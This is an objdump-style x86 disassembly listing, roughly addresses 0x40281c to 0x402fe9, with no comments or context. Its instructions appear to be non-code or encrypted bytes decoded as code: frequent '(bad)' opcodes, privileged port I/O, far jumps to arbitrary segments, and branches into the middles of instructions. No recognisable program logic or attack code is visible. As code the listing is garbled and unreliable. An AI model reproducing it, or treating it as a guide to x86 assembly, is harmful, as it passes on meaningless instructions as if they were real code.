  40281c:	and    DWORD PTR [edi-0x63ff7006],edi
  402822:	cmp    BYTE PTR [eax+0x14eab74b],dh
  402828:	jl     0x40280b
  40282a:	ja     0x402831
  40282c:	xchg   ebp,eax
  40282d:	pop    ebx
  40282e:	add    bl,dh
  402830:	cs lock leave 
  402833:	mov    ah,0xab
  402835:	push   0x1b103d21
  40283a:	pop    ecx
  40283b:	retf   0x8697
  40283e:	out    0x95,al
  402840:	cmp    bl,BYTE PTR [edi]
  402842:	sahf   
  402843:	adc    eax,0x3d1cd022
  402848:	out    dx,eax
  402849:	cmp    cl,BYTE PTR [edx]
  40284b:	es fcmove st,st(3)
  40284e:	and    al,0xb9
  402850:	inc    esi
  402851:	out    dx,al
  402852:	xchg   ebp,eax
  402853:	jnp    0x40288b
  402855:	sub    ebx,DWORD PTR [ebp+0x5f63e5d4]
  40285b:	cmp    BYTE PTR [edx+0xb48470a],0x33
  402862:	pop    esp
  402863:	rol    DWORD PTR [eax+0x72cd1ed1],1
  402869:	in     al,0x1c
  40286b:	in     al,0xc3
  40286d:	(bad)  
  40286f:	in     al,0xbc
  402871:	adc    ebp,DWORD PTR [ebx]
  402873:	adc    BYTE PTR [eax+0x20],al
  402876:	repnz push 0x23515259
  40287c:	jmp    0xf02e20ad
  402881:	push   es
  402882:	dec    ebp
  402883:	mov    esp,0x9cf5a174
  402888:	js     0x4028d0
  40288a:	test   DWORD PTR gs:[ebp+0x1e0b987],ebp
  402891:	or     ch,BYTE PTR [ecx-0x4f]
  402894:	cli    
  402895:	sbb    ebp,0x12
  402898:	mov    edi,DWORD PTR [edi+0x28]
  40289b:	sub    al,0x6a
  40289d:	ins    BYTE PTR es:[edi],dx
  40289e:	imul   esi,DWORD PTR [eax+edi*8],0x50
  4028a2:	(bad)  
  4028a3:	in     eax,0x9f
  4028a5:	loop   0x4028b8
  4028a7:	xchg   esp,eax
  4028a8:	and    DWORD PTR [edi],eax
  4028aa:	data16 mov cl,0x65
  4028ad:	stos   BYTE PTR es:[edi],al
  4028ae:	jecxz  0x402830
  4028b0:	out    dx,al
  4028b1:	adc    ebx,DWORD PTR [edx+0x46ee45b9]
  4028b7:	into   
  4028b8:	repnz clc 
  4028ba:	je     0x4028cb
  4028bc:	push   ebp
  4028bd:	xchg   ebx,eax
  4028be:	(bad)
  4028c2:	mov    esp,0x9db2b150
  4028c7:	add    dh,BYTE PTR [eax-0x67]
  4028ca:	cmp    edi,DWORD PTR [ebp-0x76]
  4028cd:	xchg   ecx,eax
  4028ce:	fidiv  WORD PTR [esi]
  4028d0:	les    esp,FWORD PTR [edx-0x35f016bc]
  4028d6:	cmp    BYTE PTR [ebp+0x4e],ch
  4028d9:	jne    0x402936
  4028db:	lds    esi,FWORD PTR [esi]
  4028dd:	popf   
  4028de:	cmp    al,0x18
  4028e0:	fidiv  DWORD PTR [ecx+0x10]
  4028e3:	aas    
  4028e4:	sbb    dh,al
  4028e6:	or     DWORD PTR [esi-0x2232c191],ebp
  4028ec:	loope  0x402949
  4028ee:	or     BYTE PTR [ecx],al
  4028f0:	rcr    edi,cl
  4028f2:	or     bh,dl
  4028f4:	xor    esp,DWORD PTR [edx]
  4028f6:	mov    al,0xc
  4028f8:	test   ebx,esi
  4028fa:	mov    dl,0x8d
  4028fc:	inc    ebx
  4028fd:	es pop esi
  4028ff:	mov    esi,0x1e143153
  402904:	fmul   QWORD PTR [ebx-0x55decb65]
  40290a:	push   0xfffffff5
  40290c:	mov    cl,0x57
  40290e:	and    eax,0x9fba69a2
  402913:	and    BYTE PTR [ebx],dl
  402915:	daa    
  402916:	inc    edx
  402917:	retf   
  402918:	pop    ebp
  402919:	(bad)  
  40291a:	mov    ds:0x56a12959,al
  40291f:	ins    BYTE PTR es:[edi],dx
  402920:	aam    0x4b
  402922:	ins    BYTE PTR es:[edi],dx
  402923:	fldcw  WORD PTR [ebp-0x30]
  402926:	dec    ebx
  402927:	dec    edx
  402928:	fiadd  WORD PTR [ebx-0x41]
  40292b:	xchg   ecx,eax
  40292c:	pop    edi
  40292d:	int    0x8
  40292f:	enter  0x5aae,0xea
  402933:	in     eax,0x56
  402935:	xchg   dl,bl
  402937:	or     dh,BYTE PTR [edi+0x49]
  40293a:	pushf  
  40293b:	inc    eax
  40293c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40293d:	jl     0x402989
  40293f:	inc    esp
  402940:	push   ecx
  402941:	out    dx,al
  402942:	ret    
  402943:	or     edi,DWORD PTR [eax-0x3d]
  402946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402947:	mov    ch,0x27
  402949:	fsub   DWORD PTR [eax-0x75e77920]
  40294f:	rol    DWORD PTR ds:0xc60a5b79,0xc5
  402956:	cmp    eax,0xa9794213
  40295b:	cmp    al,0x44
  40295d:	test   eax,0xc4f37fdf
  402962:	mov    ebp,0x955fe4c
  402967:	inc    ebp
  402968:	mov    BYTE PTR [esi+ebx*2+0x70804066],cl
  40296f:	sub    al,BYTE PTR [edi]
  402971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402972:	xor    al,0x3c
  402974:	push   ds
  402975:	jl     0x402918
  402977:	cmp    edi,DWORD PTR [eax-0x52]
  40297a:	dec    eax
  40297b:	xchg   esi,eax
  40297c:	sbb    eax,DWORD PTR [ecx-0x22]
  40297f:	add    DWORD PTR [esi],0x14f09ad8
  402985:	imul   eax,DWORD PTR [edx+0x2d],0xead23228
  40298c:	sub    al,0xb7
  40298e:	iret   
  40298f:	dec    ecx
  402990:	popf   
  402991:	adc    al,0xc5
  402993:	dec    ecx
  402994:	sub    BYTE PTR [ebp-0x64],bh
  402997:	rol    BYTE PTR [edx-0x46b8a6dd],1
  40299d:	add    eax,0x230b9d88
  4029a2:	or     al,0x20
  4029a4:	das    
  4029a5:	pop    ebp
  4029a6:	cmp    al,0x1e
  4029a8:	jb     0x402a1b
  4029aa:	inc    esp
  4029ab:	gs dec eax
  4029ad:	das    
  4029ae:	les    esi,FWORD PTR [ebx-0x64f0fc23]
  4029b4:	add    BYTE PTR [esi+0x18fe0d8a],bh
  4029ba:	inc    esp
  4029bb:	sbb    esi,DWORD PTR [edx]
  4029bd:	push   esi
  4029be:	lods   al,BYTE PTR ds:[esi]
  4029bf:	rol    BYTE PTR [edx-0x57d001d7],0x55
  4029c6:	out    0x10,eax
  4029c8:	pusha  
  4029c9:	sub    al,0x9
  4029cb:	xchg   ecx,eax
  4029cc:	data16 jge 0x402a0a
  4029cf:	lahf   
  4029d0:	imul   edx,DWORD PTR [esi+esi*4-0x17fa7e80],0x4d62a099
  4029db:	push   ebx
  4029dc:	lea    ecx,[ecx+0x7]
  4029df:	mov    BYTE PTR [edi+ebp*1+0xb64e935],dl
  4029e6:	lods   eax,DWORD PTR ds:[esi]
  4029e7:	and    DWORD PTR [edi+0x52cd5032],edi
  4029ed:	pusha  
  4029ee:	outs   dx,BYTE PTR ds:[esi]
  4029ef:	push   0xffffffba
  4029f1:	in     eax,0xe7
  4029f3:	inc    ebx
  4029f4:	int3   
  4029f5:	(bad)  
  4029f6:	popa   
  4029f7:	add    DWORD PTR [edx+0x18],0x1f
  4029fb:	push   ebp
  4029fc:	mov    WORD PTR [ecx-0x7cb11c52],?
  402a02:	add    BYTE PTR [esi+0xd],0xe2
  402a06:	cli    
  402a07:	fwait
  402a08:	mov    WORD PTR [edx+edx*2+0x589188e8],es
  402a0f:	and    esp,DWORD PTR [edi-0x31]
  402a12:	push   ebp
  402a13:	dec    esp
  402a14:	lods   al,BYTE PTR ds:[esi]
  402a15:	mov    ecx,0x65953531
  402a1a:	out    dx,al
  402a1b:	lea    eax,[ebx+0x21]
  402a1e:	cmp    eax,0x42f20c2d
  402a23:	in     eax,dx
  402a24:	mov    bl,0x96
  402a26:	xor    dl,BYTE PTR [ebp+0x12afc01f]
  402a2c:	das    
  402a2d:	mov    dl,0x21
  402a2f:	std    
  402a30:	ficomp DWORD PTR [ebp+0x6a34d09e]
  402a36:	jp     0x402a4e
  402a38:	add    BYTE PTR [eax+0x1b],dl
  402a3b:	sub    ah,cl
  402a3d:	mov    esi,0xaad94e38
  402a42:	repz and edi,esi
  402a45:	in     al,0x92
  402a47:	sub    ah,BYTE PTR [edi-0x6b]
  402a4a:	cmp    BYTE PTR [edx-0x3a91240e],ch
  402a50:	adc    eax,0xc90e7038
  402a55:	xchg   ebp,eax
  402a56:	(bad)  
  402a57:	xchg   ecx,eax
  402a58:	loope  0x4029f4
  402a5a:	rcl    DWORD PTR [ebp-0x74ab4f94],0xc8
  402a61:	inc    edi
  402a62:	push   ds
  402a63:	pop    ss
  402a64:	cmp    edi,DWORD PTR [eax-0x7d]
  402a67:	add    ebx,DWORD PTR [edi-0x73]
  402a6a:	jmp    DWORD PTR [ebp-0x42]
  402a6d:	and    BYTE PTR [esi+0x6f1f6a27],0xaa
  402a74:	mov    al,0x9f
  402a76:	mov    ch,0x18
  402a78:	out    dx,eax
  402a79:	push   cs
  402a7a:	jns    0x402ae1
  402a7c:	add    eax,0x4780de05
  402a81:	pop    esp
  402a82:	xor    al,0x97
  402a84:	sbb    BYTE PTR [esi+0x33],0x82
  402a88:	cmp    al,0xab
  402a8a:	jns    0x402a6f
  402a8c:	ja     0x402aef
  402a8e:	jnp    0x402a98
  402a90:	jae    0x402abc
  402a92:	sub    cl,bl
  402a94:	pop    esi
  402a95:	push   ecx
  402a96:	scas   eax,DWORD PTR es:[edi]
  402a97:	add    ch,BYTE PTR [edx]
  402a99:	mov    ebx,0x5b9db9e3
  402a9e:	mov    ds:0x7e4ea745,al
  402aa3:	cmp    esi,ecx
  402aa5:	adc    edi,DWORD PTR ds:0x9534980c
  402aab:	sub    DWORD PTR ds:0xa107fa15,eax
  402ab1:	pop    ecx
  402ab2:	xor    esp,DWORD PTR [esi-0x43ca0e0]
  402ab8:	xchg   esp,eax
  402ab9:	inc    esp
  402aba:	inc    ecx
  402abb:	dec    ebp
  402abc:	jmp    0x402a59
  402abe:	nop
  402abf:	jno    0x402acc
  402ac1:	ins    BYTE PTR es:[edi],dx
  402ac2:	stos   DWORD PTR es:[edi],eax
  402ac3:	push   ss
  402ac4:	or     eax,0x64739098
  402ac9:	jo     0x402ad5
  402acb:	mov    ecx,0x2231285c
  402ad0:	(bad)  
  402ad1:	cli    
  402ad2:	ja     0x402aba
  402ad4:	sti    
  402ad5:	ficom  DWORD PTR [edi]
  402ad7:	fst    DWORD PTR [ebx]
  402ad9:	push   ds
  402ada:	imul   DWORD PTR [ebp+0x68]
  402add:	das    
  402ade:	pop    edi
  402adf:	cs retf 
  402ae1:	mov    ebp,0xc6a0dca2
  402ae6:	out    0x2c,eax
  402ae8:	sbb    ecx,ebx
  402aea:	or     BYTE PTR [edx+0x1d8e2e86],ch
  402af0:	es (bad) 
  402af2:	in     eax,0xb9
  402af4:	scas   eax,DWORD PTR es:[edi]
  402af5:	inc    edi
  402af6:	mov    ds:0xe0674cb4,eax
  402afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402afc:	xor    BYTE PTR [ecx+0x2481bea5],al
  402b02:	sub    ecx,DWORD PTR [ebp+0x5c]
  402b05:	jno    0x402aa1
  402b07:	xchg   ebp,eax
  402b08:	ins    BYTE PTR es:[edi],dx
  402b09:	div    BYTE PTR [ecx+0x263fceb2]
  402b0f:	add    BYTE PTR [ebx+0x39],ah
  402b12:	in     eax,dx
  402b13:	imul   eax,DWORD PTR [eax-0x25],0xa19a81c
  402b1a:	popf   
  402b1b:	mov    edi,0x7e02f664
  402b20:	push   ebx
  402b21:	int    0x93
  402b23:	and    eax,0x7478eb45
  402b28:	cld    
  402b29:	(bad)  
  402b2a:	stos   BYTE PTR es:[edi],al
  402b2b:	xor    dl,bl
  402b2d:	(bad)  
  402b2e:	mov    edi,0x4b35e145
  402b33:	push   esp
  402b34:	sahf   
  402b35:	mov    cl,BYTE PTR fs:[edi+0x7213402a]
  402b3c:	shr    esp,1
  402b3e:	outs   dx,DWORD PTR ds:[esi]
  402b3f:	scas   eax,DWORD PTR es:[edi]
  402b40:	add    DWORD PTR [ecx+0x78],ebx
  402b43:	sbb    eax,0xe41af38a
  402b48:	loope  0x402b16
  402b4a:	and    cl,BYTE PTR [esp+esi*4-0x28dee79d]
  402b51:	adc    BYTE PTR [eax+ebx*2],al
  402b54:	stos   DWORD PTR es:[edi],eax
  402b55:	stc    
  402b56:	fistp  DWORD PTR [eax+0x30d072da]
  402b5c:	stos   BYTE PTR es:[edi],al
  402b5d:	cmp    ecx,DWORD PTR [ebx+0x56]
  402b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b61:	repnz dec esi
  402b63:	repz pop eax
  402b65:	xchg   ebx,eax
  402b66:	dec    edx
  402b67:	scas   al,BYTE PTR es:[edi]
  402b68:	and    DWORD PTR [ebx+0xf],ebp
  402b6b:	sbb    bl,BYTE PTR [ebp-0x24b7a8ab]
  402b71:	or     ebx,ebx
  402b73:	mov    esp,0x3d9e21b3
  402b78:	dec    ebx
  402b79:	ds inc esi
  402b7b:	cmp    edx,esp
  402b7d:	cmp    cl,cl
  402b7f:	and    esi,DWORD PTR [ecx+0x61845669]
  402b85:	lods   eax,DWORD PTR ds:[esi]
  402b86:	outs   dx,DWORD PTR ds:[esi]
  402b87:	je     0x402b31
  402b89:	idiv   bh
  402b8b:	pusha  
  402b8c:	adc    eax,0xb87fa882
  402b91:	jbe    0x402b2e
  402b93:	add    cl,bh
  402b95:	loope  0x402b29
  402b97:	inc    ebx
  402b98:	ss or  al,0xcc
  402b9b:	xor    ah,BYTE PTR [esp+edi*4-0x70b59612]
  402ba2:	jmp    0x911:0x9686962d
  402ba9:	cdq    
  402baa:	pop    ebx
  402bab:	les    edi,FWORD PTR [ebp-0xe]
  402bae:	repnz xchg ecx,eax
  402bb0:	pop    ss
  402bb1:	jmp    0xeb2fc513
  402bb6:	stc    
  402bb7:	popa   
  402bb8:	dec    esp
  402bb9:	sahf   
  402bba:	jle    0x402c1d
  402bbc:	fdivr  QWORD PTR [ecx-0x61]
  402bbf:	sbb    bl,cl
  402bc1:	test   ebx,ebp
  402bc3:	idiv   DWORD PTR [eax+eax*4]
  402bc6:	in     eax,0xb8
  402bc8:	not    bh
  402bca:	jmp    DWORD PTR [edi-0x4bdde4ef]
  402bd0:	imul   esp,edx,0xc8ee8cda
  402bd6:	out    dx,al
  402bd7:	popf   
  402bd8:	mov    eax,0xc013cc72
  402bdd:	std    
  402bde:	call   FWORD PTR [edi-0x3daeda2f]
  402be4:	jmp    DWORD PTR [eax]
  402be6:	cmp    DWORD PTR [esi],esi
  402be8:	(bad)  
  402be9:	sbb    esi,DWORD PTR [ecx+0x6f4be534]
  402bef:	xchg   esp,eax
  402bf0:	bound  esi,QWORD PTR [edi-0x18]
  402bf3:	ins    DWORD PTR es:[edi],dx
  402bf4:	and    BYTE PTR [edx-0xe06cfda],dl
  402bfa:	imul   ebx,DWORD PTR ds:0x5967b8ef,0x5b197a3e
  402c04:	sbb    DWORD PTR [eax+0x77],esi
  402c07:	adc    ecx,ebx
  402c09:	fs cwde 
  402c0b:	(bad)  
  402c0c:	int    0xb8
  402c0e:	sbb    ebx,esp
  402c10:	add    al,0xe7
  402c12:	out    0x8b,eax
  402c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c15:	jnp    0x402c70
  402c17:	inc    eax
  402c18:	push   ds
  402c19:	xchg   DWORD PTR [edx+0x33fbdbe0],esp
  402c1f:	repz cld 
  402c21:	cmovp  esp,DWORD PTR [ebp-0x5e713856]
  402c28:	xchg   esi,eax
  402c29:	pop    ebp
  402c2a:	mov    DWORD PTR [ebx+0x74],ecx
  402c2d:	in     eax,0x41
  402c2f:	sbb    edi,eax
  402c31:	or     ch,ch
  402c33:	fisttp WORD PTR [eax-0x60]
  402c36:	popf   
  402c37:	xlat   BYTE PTR ds:[ebx]
  402c38:	xor    al,0x85
  402c3a:	xor    al,0xa1
  402c3c:	adc    DWORD PTR ds:0x475ed8e5,esp
  402c42:	pop    edi
  402c43:	aad    0x71
  402c45:	sbb    eax,DWORD PTR [ebp+0x6b]
  402c48:	and    DWORD PTR [ebx+0x41354eab],0x35d5188d
  402c52:	push   edi
  402c53:	das    
  402c54:	lahf   
  402c55:	sub    BYTE PTR [eax],0x7
  402c58:	stc    
  402c59:	add    DWORD PTR [esp+ebx*4+0x50],edi
  402c5d:	adc    BYTE PTR [ebx-0x2844f584],0xcb
  402c64:	fsub   st(1),st
  402c67:	dec    eax
  402c68:	mov    DWORD PTR [ebp-0x502ccd77],ebp
  402c6e:	add    DWORD PTR [eax-0x76c1e5cf],eax
  402c74:	(bad)  
  402c76:	shl    BYTE PTR ds:0x7b76954e,cl
  402c7c:	push   ds
  402c7d:	adc    DWORD PTR [esi*2+0x7f116bff],ebx
  402c84:	rcl    DWORD PTR [edi+edi*2-0x7f],1
  402c88:	sub    ebp,edi
  402c8a:	stos   DWORD PTR es:[edi],eax
  402c8b:	cmp    al,0x55
  402c8d:	mov    dl,0x9c
  402c8f:	xchg   edi,eax
  402c90:	add    DWORD PTR [ebp-0x68],eax
  402c93:	add    BYTE PTR [esi],bl
  402c95:	pop    ds
  402c96:	mov    edi,0x924ff54f
  402c9b:	fstp   DWORD PTR [edi-0x1479198b]
  402ca1:	jmp    0x402c74
  402ca3:	mov    cl,0x21
  402ca5:	ror    DWORD PTR [ecx-0x47],0xdb
  402ca9:	outs   dx,BYTE PTR ds:[esi]
  402caa:	add    esp,ebx
  402cac:	leave  
  402cad:	out    dx,eax
  402cae:	adc    dl,ah
  402cb0:	es jecxz 0x402cd3
  402cb3:	fst    st(0)
  402cb5:	fstp   DWORD PTR [edx-0x75b6cee3]
  402cbb:	addr16 ret 
  402cbd:	loop   0x402c9a
  402cbf:	in     eax,0xb7
  402cc1:	push   ds
  402cc2:	imul   ebx,DWORD PTR [edx+0x4febb54c],0xc1465f44
  402ccc:	imul   ebp,DWORD PTR ds:0x914fe5f9,0x52
  402cd3:	loope  0x402cbd
  402cd5:	pop    ebp
  402cd6:	xor    BYTE PTR [ebx],0x22
  402cd9:	retf   
  402cda:	xchg   ebx,eax
  402cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402cdc:	xor    ah,BYTE PTR [ebx+eax*1+0x6dcb918]
  402ce3:	jo     0x402d37
  402ce5:	dec    esi
  402ce6:	mov    al,ds:0xe9b629ba
  402ceb:	enter  0x2009,0xd0
  402cef:	mov    ah,0xf6
  402cf1:	loope  0x402d15
  402cf3:	push   ebp
  402cf4:	into   
  402cf5:	and    DWORD PTR [ecx-0x59767fa],esi
  402cfb:	arpl   WORD PTR ds:0x8c0521ea,sp
  402d01:	or     al,0x2
  402d03:	push   edx
  402d04:	push   ecx
  402d05:	pop    edx
  402d06:	pop    edi
  402d07:	inc    ebp
  402d08:	(bad)  
  402d09:	in     eax,dx
  402d0a:	and    DWORD PTR [edi-0x668b9e70],ecx
  402d10:	push   ss
  402d11:	and    BYTE PTR [ebx],bh
  402d13:	shr    al,cl
  402d15:	and    ebp,DWORD PTR [ebp-0xa9bf8fb]
  402d1b:	lds    esi,FWORD PTR [ecx+ebx*2-0x32bcd3d7]
  402d22:	mov    cl,0x13
  402d24:	int    0xfe
  402d26:	mov    cl,BYTE PTR [ebp-0x56]
  402d29:	mov    esp,0x4da30cc1
  402d2e:	or     BYTE PTR [eax+edi*1+0x15cf8c6],cl
  402d35:	pop    edi
  402d36:	push   ecx
  402d37:	adc    DWORD PTR [edx+0x39c49868],edx
  402d3d:	(bad)  
  402d3e:	inc    dl
  402d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d41:	and    eax,0xb833f22a
  402d46:	sti    
  402d47:	(bad)  
  402d48:	pushw  ds
  402d4a:	shl    DWORD PTR [ebx-0x13],cl
  402d4d:	mov    dl,0xc4
  402d4f:	fiadd  WORD PTR [ecx-0x7c]
  402d52:	pop    es
  402d53:	mov    eax,ds:0x506a3e3a
  402d58:	je     0x402cfe
  402d5a:	pop    edx
  402d5b:	(bad)  
  402d5d:	loopne 0x402d12
  402d5f:	push   ebp
  402d60:	or     al,0x85
  402d62:	icebp  
  402d63:	xor    eax,0x3c2a1fc5
  402d68:	or     eax,0x8a3f3da2
  402d6d:	xchg   edi,eax
  402d6e:	sub    al,0xa4
  402d70:	jecxz  0x402d92
  402d72:	pop    ebp
  402d73:	(bad)  
  402d74:	mov    cs,ebp
  402d76:	call   0x131c:0x29033cef
  402d7d:	xor    eax,0xf809dc8a
  402d82:	sub    dh,BYTE PTR [eax]
  402d84:	sub    ebx,DWORD PTR [ecx+0x7c]
  402d87:	(bad)  
  402d88:	test   DWORD PTR [eax-0x30b213ab],0xc3f94272
  402d92:	fs (bad) 
  402d94:	fcmovnbe st,st(1)
  402d96:	imul   edx,DWORD PTR [ecx-0x13],0x84a29529
  402d9d:	cdq    
  402d9e:	jbe    0x402ded
  402da0:	and    dh,0xca
  402da3:	mov    bh,0x89
  402da5:	xlat   BYTE PTR ds:[ebx]
  402da6:	pop    eax
  402da7:	add    eax,0xf778a84
  402dac:	js     0x402dbf
  402dae:	jne    0x402d98
  402db0:	push   ebp
  402db1:	pop    esi
  402db2:	out    0x89,al
  402db4:	adc    ebx,DWORD PTR [ecx-0x6b1e1461]
  402dba:	jg     0x402e00
  402dbc:	jmp    0x402d4c
  402dbe:	mov    ecx,?
  402dc0:	inc    ebx
  402dc1:	inc    ecx
  402dc2:	xor    BYTE PTR [ebx+0x2c2b06f4],al
  402dc8:	jnp    0x402e0e
  402dca:	into   
  402dcb:	jg     0x402dc8
  402dcd:	inc    ebx
  402dce:	mov    edi,0xf9f25086
  402dd3:	mov    cl,0x91
  402dd5:	cmp    ebx,ebx
  402dd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dd8:	test   eax,ebp
  402dda:	dec    eax
  402ddb:	mov    al,ds:0xe74f0d26
  402de0:	pop    DWORD PTR [ebp-0x5e8ef39a]
  402de6:	dec    eax
  402de7:	(bad)  
  402de8:	jbe    0x402d8e
  402dea:	test   DWORD PTR [esi-0xa19e051],edx
  402df0:	sbb    ebp,DWORD PTR [eax]
  402df2:	loop   0x402d7f
  402df4:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402df6:	clc    
  402df7:	shr    eax,cl
  402df9:	and    ebx,DWORD PTR [ecx-0x33f16de4]
  402dff:	pop    eax
  402e00:	push   edi
  402e01:	or     DWORD PTR [ecx-0x506d2e52],0xe86e5c89
  402e0b:	sub    BYTE PTR [ecx+esi*8+0x1a99b251],0x7c
  402e13:	shl    esp,cl
  402e15:	stos   DWORD PTR es:[edi],eax
  402e16:	pop    es
  402e17:	push   ds
  402e18:	int3   
  402e19:	xchg   esp,eax
  402e1a:	out    dx,eax
  402e1b:	jge    0x402dac
  402e1d:	iret   
  402e1e:	dec    esp
  402e1f:	add    ecx,DWORD PTR [ebx+0x50]
  402e22:	dec    ebp
  402e23:	imul   esi,DWORD PTR [ebx+ebp*2-0xf],0x1a890b0
  402e2b:	push   0xfffffff6
  402e2d:	rcr    DWORD PTR [ecx-0x29],0x1f
  402e31:	sub    esp,DWORD PTR [ebp-0x36]
  402e34:	daa    
  402e35:	mov    esp,0x3ecc31a6
  402e3a:	jcxz   0x402e25
  402e3d:	adc    BYTE PTR [edx+0x39],dh
  402e40:	push   esp
  402e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e42:	into   
  402e43:	call   0xee34c74b
  402e48:	mov    ds:0xd9f105b0,al
  402e4d:	lods   eax,DWORD PTR ds:[esi]
  402e4e:	jge    0x402e69
  402e50:	rcl    eax,1
  402e52:	lahf   
  402e53:	in     al,0x3d
  402e55:	fstp   TBYTE PTR ds:0x563af3e7
  402e5b:	push   0xffffff83
  402e5d:	mov    edi,0x522f156
  402e62:	and    edi,DWORD PTR [ebx-0x66]
  402e65:	mov    bl,0x43
  402e67:	mov    esi,0x6b143b7e
  402e6c:	inc    ecx
  402e6d:	das    
  402e6e:	(bad)  
  402e6f:	push   edx
  402e70:	scas   eax,DWORD PTR es:[edi]
  402e71:	bound  edx,QWORD PTR [edi]
  402e73:	sub    DWORD PTR [edx+0x62947478],edx
  402e79:	imul   esp,DWORD PTR [ecx-0x53],0x26
  402e7d:	cwde   
  402e7e:	pop    eax
  402e7f:	or     esp,DWORD PTR [esp+ecx*4]
  402e82:	xor    DWORD PTR [bp+di-0x36],edi
  402e86:	fld    TBYTE PTR [ecx+0x7f]
  402e89:	aad    0x91
  402e8b:	push   cs
  402e8c:	(bad)  
  402e8d:	lods   al,BYTE PTR ds:[esi]
  402e8e:	inc    esp
  402e8f:	enter  0x95bd,0x48
  402e93:	adc    al,0xe7
  402e95:	popf   
  402e96:	mov    eax,0xf10c3746
  402e9b:	jb     0x402f17
  402e9d:	and    al,0xfc
  402e9f:	clc    
  402ea0:	xor    DWORD PTR [edi-0x6bae5099],ebx
  402ea6:	mov    bh,0xd9
  402ea8:	mov    cl,0x2
  402eaa:	pop    edx
  402eab:	cmc    
  402eac:	xor    DWORD PTR [ebp-0x48],eax
  402eaf:	lods   al,BYTE PTR ds:[esi]
  402eb0:	mov    ebp,0x3e5055f1
  402eb5:	sahf   
  402eb6:	pop    edx
  402eb7:	cmp    al,0xfb
  402eb9:	adc    eax,0x14eefd6f
  402ebe:	popf   
  402ebf:	loop   0x402eef
  402ec1:	cs sbb edi,ebx
  402ec4:	xchg   DWORD PTR [edi+0x67],esp
  402ec7:	imul   ecx,DWORD PTR [ebp+0x5e6d51cc],0x79a35c0d
  402ed1:	add    cl,BYTE PTR [esi+0x7a90e1e8]
  402ed7:	mov    edi,0x13e15c1f
  402edc:	sub    dh,BYTE PTR [esi-0x53527c5a]
  402ee2:	cld    
  402ee3:	(bad)  
  402ee4:	push   cs
  402ee5:	in     eax,0x29
  402ee7:	call   0x38eb:0x21f1e91e
  402eee:	in     al,0x73
  402ef0:	fld    DWORD PTR [ecx-0x5cd0cc4]
  402ef6:	dec    ecx
  402ef7:	mov    dh,0x63
  402ef9:	mov    esi,0x18e6f1a
  402efe:	rol    BYTE PTR [edx],0xe8
  402f01:	mov    ds:0x5583e65d,al
  402f06:	inc    esp
  402f07:	shr    ecx,0xed
  402f0a:	add    ah,BYTE PTR [edi+0x59be2f4d]
  402f10:	xchg   ecx,eax
  402f11:	mov    al,ds:0x23cb2f85
  402f16:	outs   dx,DWORD PTR ds:[esi]
  402f17:	mov    ah,BYTE PTR [ebp-0x31]
  402f1a:	ins    BYTE PTR es:[edi],dx
  402f1b:	add    edi,edi
  402f1d:	mov    edx,0x8a4c9404
  402f22:	inc    esi
  402f23:	xchg   ebx,eax
  402f24:	je     0x402ef4
  402f26:	xor    eax,0x127b6a98
  402f2b:	repz mov es,WORD PTR [ebx]
  402f2e:	mov    edx,0xcc500400
  402f33:	sti    
  402f34:	mov    ebx,0xeb7adfde
  402f39:	sbb    al,0x43
  402f3b:	jb     0x402f31
  402f3d:	mov    dh,0x8b
  402f3f:	inc    esi
  402f40:	cmp    DWORD PTR [edi+0x125f629f],0x3608a69a
  402f4a:	push   ds
  402f4b:	or     al,0x5f
  402f4d:	outs   dx,BYTE PTR ds:[esi]
  402f4e:	mov    bh,0xf4
  402f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f51:	xor    eax,DWORD PTR [eax+eax*1+0x6e03d2c8]
  402f58:	inc    ebx
  402f59:	add    DWORD PTR [esi+0x79],esp
  402f5c:	lods   al,BYTE PTR ds:[esi]
  402f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f5e:	push   ds
  402f5f:	out    0x80,al
  402f61:	in     eax,dx
  402f62:	ss ds daa 
  402f65:	pusha  
  402f66:	xchg   edi,eax
  402f67:	fidivr DWORD PTR [eax+0x5edb1c25]
  402f6d:	sar    esp,cl
  402f6f:	sbb    ah,dl
  402f71:	lea    esi,[esi-0x65f4b10f]
  402f77:	out    dx,eax
  402f78:	pop    ebp
  402f79:	push   ebp
  402f7a:	ret    
  402f7b:	mov    esi,0x1a54b54c
  402f80:	xor    ecx,DWORD PTR [eax]
  402f82:	sbb    eax,0xf64d2241
  402f87:	fnsave [ebx+esi*4-0x1b19c21f]
  402f8e:	sbb    si,bx
  402f91:	mov    ebp,0xd4922ac0
  402f96:	jl     0x402fab
  402f98:	or     edi,DWORD PTR fs:[ebx-0x5a7bc7d]
  402f9f:	sbb    BYTE PTR [edi],ch
  402fa1:	cmp    eax,0x49e6cf7c
  402fa6:	loope  0x402fd8
  402fa8:	lea    esi,[eax]
  402faa:	mov    ds:0xee690a5a,eax
  402faf:	sub    dl,BYTE PTR [eax+0x25]
  402fb2:	jo     0x40302a
  402fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fb5:	jno    0x40302f
  402fb7:	add    ah,bh
  402fb9:	add    al,0x1d
  402fbb:	mov    ds:0xbccb045a,al
  402fc0:	inc    eax
  402fc1:	dec    esp
  402fc2:	aad    0x18
  402fc4:	sbb    DWORD PTR [eax],edi
  402fc6:	outs   dx,BYTE PTR ds:[esi]
  402fc8:	nop
  402fc9:	ret    
  402fca:	retf   
  402fcb:	cmp    edx,ebp
  402fcd:	cpuid  
  402fcf:	jo     0x402ffa
  402fd1:	push   0x53
  402fd3:	(bad)  
  402fd5:	scas   eax,DWORD PTR es:[edi]
  402fd6:	dec    BYTE PTR [eax+0x751a4d4a]
  402fdc:	gs out dx,al
  402fde:	lea    ebp,[ebp-0x43c0dc4e]
  402fe4:	sub    al,0xae
  402fe6:	adc    dl,ah
  402fe8:	int3   
  402fe9:	sub    eax,0x5c40b6c6
